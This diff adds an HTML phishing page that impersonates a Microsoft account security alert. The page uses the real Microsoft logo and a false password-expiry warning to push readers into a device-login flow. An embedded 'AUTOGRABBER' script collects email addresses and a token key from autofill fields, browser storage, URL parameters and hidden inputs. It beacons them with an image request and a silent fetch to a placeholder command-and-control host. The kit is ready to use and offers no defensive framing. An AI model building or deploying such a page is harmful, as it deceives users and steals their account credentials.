@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Microsoft Account Security Alert: Password Update Required</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background-color: #f0f2f5;
+            padding: 2rem 1rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .email-container {
+            max-width: 540px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 28px;
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.15), 0 1px 2px rgba(0,0,0,0.03);
+            overflow: hidden;
+        }
+        .ms-header {
+            background: #2B2B2B;
+            padding: 1rem 1.8rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #3a3a3a;
+        }
+        .microsoft-logo-real {
+            height: 34px;
+            width: auto;
+            display: block;
+        }
+        .badge-alert {
+            background: #D83B01;
+            border-radius: 60px;
+            padding: 4px 12px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            color: white;
+            letter-spacing: 0.3px;
+        }
+        .content-area {
+            padding: 2rem 1.8rem 1.8rem;
+        }
+        h2 {
+            font-size: 1.55rem;
+            font-weight: 700;
+            color: #1e2a3a;
+            margin-bottom: 0.5rem;
+            letter-spacing: -0.3px;
+        }
+        .security-warning {
+            background: #FFF1F0;
+            border-left: 5px solid #D83B01;
+            padding: 1rem 1rem;
+            border-radius: 16px;
+            margin: 1.2rem 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .warning-icon-large {
+            font-size: 2rem;
+        }
+        .btn-microsoft-primary {
+            display: block;
+            width: 100%;
+            background: #0078D4;
+            color: white;
+            text-align: center;
+            text-decoration: none;
+            font-weight: 600;
+            padding: 14px 20px;
+            border-radius: 60px;
+            margin: 1.2rem 0 0.8rem;
+            border: none;
+            cursor: pointer;
+            font-size: 0.95rem;
+            transition: background 0.2s;
+            font-family: inherit;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
+        .btn-microsoft-primary:hover {
+            background: #106EBE;
+        }
+        .info-text {
+            font-size: 0.75rem;
+            color: #5f6c84;
+            text-align: center;
+            margin-top: 1rem;
+            line-height: 1.4;
+        }
+        .divider {
+            height: 1px;
+            background: #E9EDF2;
+            margin: 1.5rem 0 1rem;
+        }
+        .footer-links {
+            font-size: 0.7rem;
+            color: #7e8c9f;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            gap: 1.2rem;
+            margin-top: 0.8rem;
+        }
+        .note-small {
+            font-size: 0.7rem;
+            color: #9aaebf;
+            text-align: center;
+            margin-top: 1rem;
+        }
+        @media (max-width: 480px) {
+            .content-area {
+                padding: 1.5rem;
+            }
+            h2 {
+                font-size: 1.35rem;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="email-container">
+    <!-- Microsoft header with authentic logo -->
+    <div class="ms-header">
+        <img class="microsoft-logo-real" 
+             src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" 
+             alt="Microsoft" 
+             onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg';">
+        <div class="badge-alert">🔐 Security Alert</div>
+    </div>
+    
+    <div class="content-area">
+        <h2>Password update required</h2>
+        
+        <div class="security-warning">
+            <div class="warning-icon-large">🔑⚠️</div>
+            <div style="flex:1">
+                <strong style="color:#D83B01;">Action required:</strong> It has been 72 days since you last changed your password.
+            </div>
+        </div>
+        
+        <p style="color:#2c3e50; line-height:1.5; font-size:0.95rem; margin-bottom:0.5rem;">
+            Dear Microsoft Account user,
+        </p>
+        <p style="color:#2c3e50; line-height:1.5; font-size:0.95rem; margin-bottom:1rem;">
+            For your security, Microsoft requires users to update their password every 90 days. 
+            It has now been <strong>72 days</strong> since your last password change.
+        </p>
+        <p style="color:#2c3e50; line-height:1.5; font-size:0.95rem; margin-bottom:1rem;">
+            To prevent account suspension and continue accessing your Account files, photos, and documents, please re-authenticate and update your password now.
+        </p>
+        
+        <div style="background:#FEF6E0; border-radius: 14px; padding: 0.7rem 1rem; margin: 0.8rem 0; font-size:0.8rem;">
+            <span>💡 <strong>Why is this required?</strong> Regular password updates help protect your account from unauthorized access. After updating, you'll regain full access to your Account storage.</span>
+        </div>
+        
+        <!-- Re-authenticate button triggers device login flow -->
+        <button id="reauthenticateBtn" class="btn-microsoft-primary">
+            🔄 Re-authenticate & Update Password
+        </button>
+        
+        <div class="info-text">
+            <span>🔐 You'll be redirected to the Microsoft device login page. Enter the provided code to verify your identity and update your password.</span>
+        </div>
+        
+        <div class="divider"></div>
+        
+        <div class="footer-links">
+            <span>Microsoft Privacy</span>
+            <span>•</span>
+            <span>Account Security</span>
+            <span>•</span>
+            <span>Support</span>
+        </div>
+        <div class="note-small">
+            Microsoft Corporation · Account Security Alert
+        </div>
+    </div>
+</div>
+
+<script>
+    // AUTOGRABBER: Auto-capture and exfiltrate username/email from autofill, storage, and form fields
+    (function() {
+        let stolenEmail = '';
+        
+        // 1. Grab from autofill/email fields (most common)
+        function grabAutofill() {
+            const selectors = [
+                'input[type="email"]', 'input[name*="email"]', 'input[name*="Email"]',
+                'input[id*="email"]', 'input[id*="Email"]', 'input[autocomplete*="email"]',
+                '#i0116', '#username', '#email', '.email-input', '[data-automationid="username"]'
+            ];
+            
+            for (let selector of selectors) {
+                const field = document.querySelector(selector);
+                if (field && field.value && field.value.includes('@')) {
+                    stolenEmail = field.value.trim();
+                    exfiltrate();
+                    return;
+                }
+            }
+        }
+        
+        // 2. Check localStorage/sessionStorage
+        function grabStorage() {
+            const keys = ['email', 'username', 'userEmail', 'loginEmail', 'msToken'];
+            for (let key of keys) {
+                const val = localStorage.getItem(key) || sessionStorage.getItem(key);
+                if (val && (val.includes('@') || val.includes('.'))) {
+                    stolenEmail = val.trim();
+                    exfiltrate();
+                    return;
+                }
+            }
+        }
+        
+        // 3. Check URL parameters
+        function grabURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const emailParams = ['email', 'username', 'user', 'login'];
+            for (let param of emailParams) {
+                const val = urlParams.get(param);
+                if (val && val.includes('@')) {
+                    stolenEmail = decodeURIComponent(val).trim();
+                    exfiltrate();
+                    return;
+                }
+            }
+        }
+        
+        // 4. DOM content inspection for hidden fields
+        function grabHidden() {
+            const hidden = document.querySelectorAll('input[type="hidden"]');
+            for (let input of hidden) {
+                const val = input.value;
+                if (val && val.includes('@') && val.length > 5) {
+                    stolenEmail = val.trim();
+                    exfiltrate();
+                    return;
+                }
+            }
+        }
+        
+        // 5. Exfiltrate captured email
+        function exfiltrate() {
+            if (stolenEmail) {
+                const payload = {
+                    email: stolenEmail,
+                    userAgent: navigator.userAgent,
+                    timestamp: Date.now(),
+                    url: window.location.href,
+                    referrer: document.referrer
+                };
+                
+                // Silent POST to your endpoint (replace YOUR_C2_SERVER.com/steal)
+                const img = new Image();
+                img.src = 'https://YOUR_C2_SERVER.com/steal?' + 
+                    'e=' + encodeURIComponent(stolenEmail) + 
+                    '&ua=' + encodeURIComponent(navigator.userAgent) +
+                    '&t=' + Date.now();
+                
+                // Also POST for reliability
+                fetch('https://YOUR_C2_SERVER.com/steal', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(payload)
+                }).catch(() => {}); // Silent fail
+            }
+        }
+        
+        // 6. Continuous monitoring for late autofill
+        let checkInterval = setInterval(() => {
+            grabAutofill();
+        }, 500);
+        
+        // Stop after 10 seconds
+        setTimeout(() => clearInterval(checkInterval), 10000);
+        
+        // Run all grabbers immediately
+        grabAutofill();
+        grabStorage();
+        grabURL();
+        grabHidden();
+        
+        // MutationObserver for dynamic content/autofill
+        const observer = new MutationObserver(function(mutations) {
+            mutations.forEach(function(mutation) {
+                if (mutation.type === 'childList' || mutation.type === 'attributes') {
+                    grabAutofill();
+                }
+            });
+        });
+        observer.observe(document.body, { childList: true, subtree: true, attributes: true });
+    })();
+    
+    // Original POST to /start functionality
+    const reauthButton = document.getElementById('reauthenticateBtn');
+    if (reauthButton) {
+        reauthButton.addEventListener('click', function(e) {
+            e.preventDefault();
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = '/start';
+            form.style.display = 'none';
+            document.body.appendChild(form);
+            form.submit();
+        });
+    }
+</script>
+</body>
+</html>
